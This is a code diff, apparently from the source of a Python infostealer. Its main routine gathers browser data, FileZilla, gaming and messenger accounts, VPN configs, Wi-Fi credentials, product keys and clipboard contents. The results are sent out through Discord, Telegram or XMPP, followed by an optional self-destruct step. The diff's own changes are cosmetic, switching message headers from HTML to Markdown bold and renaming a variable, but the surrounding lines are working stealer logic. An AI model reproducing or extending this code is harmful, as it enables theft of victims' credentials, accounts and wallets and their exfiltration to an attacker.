@@ -58,13 +58,12 @@ def GrabFiles() -> None:
     filezilla.FileZilla()
 
 def Browsers() -> None:
-    Config.msgBrowsers.append("\n\n<b>🌐Browsers🌐</b>")
     chromium.Browsers()
     Config.msgBrowsers = chromium.Browsers.Return()
     Config.msgBrowsers = geckodriver.GeckoDriver(Config.msgBrowsers)
 
 def Games() -> None:
-    Config.msgOther.append("\n\n<b>🕹Games🕹</b>")
+    Config.msgOther.append("\n\n**🕹Games🕹**")
     Config.msgOther = epicGames.Epic(Config.msgOther)
     Config.msgOther = Uplay.Ubisoft(Config.msgOther)
     Config.msgOther = Minecraft.Minecraft(Config.msgOther)
@@ -73,7 +72,7 @@ def Games() -> None:
     Config.msgOther =BattleNET.BattleNet(Config.msgOther)
 
 def Messagers() -> None:
-    Config.msgOther.append("\n\n<b>📬Messagers📬</b>")
+    Config.msgOther.append("\n\n\n**📬Messagers📬**")
     Config.msgOther = skype.skype(Config.msgOther)
     Config.msgOther = telegram.Telegram(Config.msgOther)
     Config.msgOther = viber.Viber(Config.msgOther)
@@ -85,7 +84,7 @@ def VPN() -> None:
     Config.msgVPN= vpn.VPN(Config.msgVPN)
 
 def System() -> None:
-    Config.msgSYS = system_info.SystemInfo(Config.msgSYS)
+    Config.msgSys = system_info.SystemInfo(Config.msgSys)
     productkey.PKay()
     wifi.Wifi()
     clipboard.ClipBoard()
@@ -103,7 +102,7 @@ def End() -> None:
     except Exception as e:
         print(e)
     try:
-        send.Send(Config.sendType,Config.np,Config.msgSYS,Config.msgBrowsers,Config.msgOther,Config.msgWallets,Config.msgFiles,Config.msgVPN,Config.discordData,Config.TelegramData,Config.xmppData)
+        send.Send(Config.sendType,Config.np,Config.msgSys,Config.msgBrowsers,Config.msgOther,Config.msgWallets,Config.msgFiles,Config.msgVPN,Config.discordData,Config.TelegramData,Config.xmppData)
     except Exception as e:
         print(e)
     ending.End(Config.np, Config.selfDestruct)
